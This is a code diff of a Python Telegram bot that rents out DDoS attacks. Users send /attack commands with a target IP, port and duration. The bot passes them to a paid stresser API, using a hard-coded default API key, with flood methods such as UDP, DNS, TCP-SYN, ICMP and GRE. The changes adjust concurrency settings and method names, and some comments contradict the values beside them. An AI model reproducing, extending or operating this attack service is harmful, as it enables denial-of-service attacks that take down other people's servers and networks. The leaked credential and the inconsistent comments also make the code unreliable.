@@ -37,15 +37,15 @@ PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 
 # CONCURRENT SETTINGS
-DEFAULT_CONCURRENT = 4  # Changed to 1 as requested
-MIN_CONCURRENT = 4
+DEFAULT_CONCURRENT = 2  # Changed to 1 as requested
+MIN_CONCURRENT = 1
 MAX_CONCURRENT = 8
 MIN_DURATION = 30
 MAX_DURATION = 300
 
 # ATTACK METHODS - UDP-FLOOD (UDP-FREE) as default
 ATTACK_METHODS = [
-    "UDP-FLOOD",  # This maps to UDP-FREE in API - DEFAULT
+    "UDP-FREE",  # This maps to UDP-FREE in API - DEFAULT
     "UDP-VSE", "UDP-DNS",
     "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
     "ICMP-FLOOD", "GRE-FLOOD",
@@ -53,7 +53,7 @@ ATTACK_METHODS = [
 ]
 
 METHOD_MAP = {
-    "UDP-FLOOD": "udp-free",  # Changed from udp-flood to udp-free
+    "UDP-FLOOD": "udp-flood",  # Changed from udp-flood to udp-free
     "UDP-VSE": "udp-vse", 
     "UDP-DNS": "udp-dns",
     "TCP-SYN": "tcp-syn",
@@ -708,7 +708,7 @@ init_owner()
 init_pseudo_owner()
 
 # ===== API FUNCTIONS =====
-async def send_api_attack(target, port, duration, method, concurrent=1):
+async def send_api_attack(target, port, duration, method, concurrent=2):
     """Send attack to API with proper concurrent parameter"""
     api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
     api_url = os.getenv("API_URL", "https://mrstresser.com/api")
@@ -1081,7 +1081,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⏱️ Remaining: {remaining}s\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
-        f"📡 Default method: UDP-FLOOD (UDP-FREE)\n"
+        f"📡 Default method: UDP-FREE (UDP-FREE)\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
         f"⚡ *ATTACK FEATURES*\n"
         f"• {DEFAULT_CONCURRENT}x concurrent connections\n"
@@ -1124,7 +1124,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 3:
         await update.message.reply_text(
             f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
-            f"Example: `/attack 91.108.17.41 32001 60` (Uses UDP-FLOOD default)\n"
+            f"Example: `/attack 91.108.17.41 32001 60` (Uses UDP-FREE default)\n"
             f"With method: `/attack 91.108.17.41 32001 60 TCP-SYN`\n"
             f"With concurrent: `/attack 91.108.17.41 32001 60 UDP-FLOOD 1`\n\n"
             f"⚡ Current concurrent: **{DEFAULT_CONCURRENT}**\n"
